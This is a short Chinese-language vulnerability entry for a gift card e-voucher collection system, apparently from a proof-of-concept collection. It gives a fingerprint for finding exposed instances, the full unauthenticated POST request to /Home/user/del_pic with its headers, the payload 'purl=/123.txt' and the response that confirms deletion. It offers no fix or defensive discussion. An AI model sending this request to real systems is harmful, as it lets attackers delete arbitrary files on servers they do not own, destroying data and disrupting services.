# 礼品卡电子券收卡系统存在前台del_pic任意文件删除漏洞

- **系统**：礼品卡电子券收卡系统　|　**类型**：其他　|　**CVE**：—
- **指纹**：`Body="/Application/Home/Static/css/style2.css"`
- **请求**：`POST /Home/user/del_pic HTTP/1.1`
- **关键头**：`Content-Length: 15`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: think_language=zh-CN; PHPSESSID=he0qhohlf53m7vu33fp7ur87mo; a27adc0b9562e4f6168d…`　`Host: 127.0.0.1`

**请求体 / payload**
```
purl=/123.txt
```
- **预期**：200　|　回显为1 即为成功删除，回显不在则不存在该文件